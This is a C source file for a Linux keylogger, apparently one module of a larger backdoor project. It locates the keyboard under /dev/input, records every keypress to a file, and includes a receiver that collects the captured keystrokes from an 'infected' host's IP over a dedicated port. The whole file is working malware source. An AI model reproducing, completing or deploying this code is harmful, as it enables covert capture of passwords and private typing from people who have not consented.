/*
 * =====================================================================================
 *
 *       Filename:  keylogger.c
 *
 *    Description:
 *
 *        Version:  1.0
 *        Created:  11/13/2018 08:01:42 PM
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  Benedict Lo & Aing Ragunathan
 *   Organization:
 *
 * =====================================================================================
 */
#include "keylogger.h"

int loop = 1;

const char *keycodes[] = {
    " <RESERVED> ",
    " <ESC> ",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "0",
    "-",
    "=",
    " <BACKSPACE> ",
    " <TAB> ",
    "Q",
    "W",
    "E",
    "R",
    "T",
    "Y",
    "U",
    "I",
    "O",
    "P",
    "{",
    "}",
    " <ENTER> ",
    " <LEFTCTRL> ",
    "A",
    "S",
    "D",
    "F",
    "G",
    "H",
    "J",
    "K",
    "L",
    ";",
    "'",
    " <GRAVE> ",
    " <LEFTSHIFT> ",
    "\\",
    "Z",
    "X",
    "C",
    "V",
    "B",
    "N",
    "M",
    //"<COMMA> ",
    ",",
    //" <DOT> ",
    ".",
    //" <SLASH> ",
    "/",
    " <RIGHTSHIFT> ",
    " <KPASTERISK> ",
    " <LEFTALT> ",
    //" <SPACE> ",
    " ",
    " <CAPSLOCK> ",
    "F1",
    "F2",
    "F3",
    "F4",
    "F5",
    "F6",
    "F7",
    "F8",
    "F9",
    "F10",
    " <NUMLOCK> ",
    " <SCROLLLOCK> "
};

/*
 * =====================================================================================
 *
 *       function: is_char_device
 *
 *         return: static int
 *
 *       Parameters:
 *                    const struct dirent *file - file to watch
 *
 *       Notes:
 *              checks the device
 * =====================================================================================
 */
/* called for ever file in the /dev/input directory */
static int is_char_device(const struct dirent *file) {
    char filename[BUFSIZ];
    int err;
    struct stat filestat;       //buffer for the stat function to fill with file info

    snprintf(filename, sizeof(filename), "%s%s", INPUT_DIR, file->d_name);
    err = stat(filename, &filestat);            //get info on the file

    if(err) {
        return 0;
    } else {
        return S_ISCHR(filestat.st_mode);       //is it a character device?
    }

}


/*
 * =====================================================================================
 *
 *       function: keyloger_send
 *
 *         return: void *
 *
 *       Parameters:
 *                  void *args_input - aruguments for input
 *
 *       Notes:
 *              sends the keyloggers input
 * =====================================================================================
 */
void *keylogger_send(void *args_input) {
    int keyboard_fd;
    FILE *fp;
    int bytesRead = 0;
    struct input_event events[NUM_EVENTS];
    int j;
    unsigned char ch[1];
    char *keyboard_device = get_keyboard_event_file();      //find the keyboard device

    //get args and parse IP of server
    keylogger_struct *args = args_input;

    if(keyboard_device == 0) {
        perror("no keyboard to read from");
    }

    if((keyboard_fd = open(keyboard_device, O_RDONLY)) < 0) {
        perror("opening descriptor to keyboard device");
        free(keyboard_device);
        exit(1);
    }


    //get key stroke and covert send key stroke to Server
    signal(SIGINT, sigint_handler);     //stops the loop if SIGINT is found

    while(loop != 0) {
        bytesRead = read(keyboard_fd, events, sizeof(struct input_event) * NUM_EVENTS);

        for(int i = 0; i < (bytesRead / (int) sizeof(struct input_event)); ++i) {
            //check for event
            if(events[i].type == EV_KEY) {
                if(events[i].value == 1) {
                    if(events[i].code > 0 && events[i].code < NUM_KEYCODES) {
                        if((fp = fopen(KEYLOGGER_FILENAME, "ab+")) < 0) {
                            perror("fopen keylogger");
                            exit(1);
                        }
                        printf("keylogger: %s\n", keycodes[events[i].code]);
                        //write to file
                        if(fwrite(keycodes[events[i].code], sizeof(char), strlen(keycodes[events[i].code]), fp) <= 0) {
                            perror("fwrite keylogger");
                            exit(1);
                        }
                        fclose(fp);
                    } else {
                        //write(writeout, "UNRECOGNIZED", sizeof("UNRECOGNIZED"));
                    }
                }
            }
        }
    }

    fclose(fp);
    printf("keylogger: exiting thread\n");
    free(keyboard_device);
    return NULL;
}

/*
 * =====================================================================================
 *
 *       function: keylogger_recv
 *
 *         return: void *
 *
 *       Parameters:
 *                  void *args_input - inputs for the keylogger
 *
 *       Notes:
 *              function to start thread for receiving results
 * =====================================================================================
 */
void *keylogger_recv(void *args_input) {
    keylogger_struct *args = args_input;
    char *keyboard_results_file = "keyboard_results";

    recv_results(args->infected_ip, KEYLOGGER_PORT, keyboard_results_file, true);

    return NULL;
}

/*
 * =====================================================================================
 *
 *       function: *get_keyboard_event_file
 *
 *         return: char *
 *
 *       Parameters:
 *
 *       Notes:
 *              gets the keyboard event from the file
 * =====================================================================================
 */
/* find the actual keyboard device file, lets not hard code this */
char *get_keyboard_event_file () {
    int num_of_files;        //
    struct dirent **event_files;
    char filename[BUFSIZ];
    char *keyboard_file = NULL;


    //list all files for character devices (keyboards) in the event_files list
    num_of_files = scandir(INPUT_DIR, &event_files, &is_char_device, &alphasort);
    if(num_of_files < 0) {
        return NULL;
    } else {
        for(int i = 0; i < num_of_files; ++i) {
            int32_t event_bitmap = 0;
            int fd;     //to the keyboard device file
            int32_t kbd_bitmap = KEY_A | KEY_B | KEY_C | KEY_Z;

            snprintf(filename, sizeof(filename), "%s%s", INPUT_DIR, event_files[i]->d_name);
            //printf("Checking device for keyboard properties: %s\n", filename);
            fd = open(filename, O_RDONLY);

            if(fd == -1) {
                perror("open failed");
                continue;
            }

            ioctl(fd, EVIOCGBIT(0, sizeof(event_bitmap)), &event_bitmap);

            //check if the keyboard has a bitmap like a keyboard
            if((EV_KEY & event_bitmap) == EV_KEY) {
                ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(event_bitmap)), &event_bitmap);
                //printf("Keyboard has bitmap properties\n");

                //check if the device supports alpha keys
                if((kbd_bitmap & event_bitmap) == kbd_bitmap) {
                    keyboard_file = strdup(filename);
                    //printf("Found keyboard with alpha keys\n");
                    close(fd);
                    break;
                }
            }

            close(fd);
        }
    }

    //cleanup scandir mem
    for(int i = 0; i < num_of_files; ++i) {
        free(event_files[i]);
    }

    free(event_files);

    return keyboard_file;
}

/*
 * =====================================================================================
 *
 *       function: sigint_handler
 *
 *         return: void
 *
 *       Parameters:
 *
 *                  int sig - signal
 *       Notes:
 *              starts the signal handler
 * =====================================================================================
 */
void sigint_handler (int sig) {
    loop = 0;
    printf("keylogger thread: received SIGINT: %d\n", sig);
}
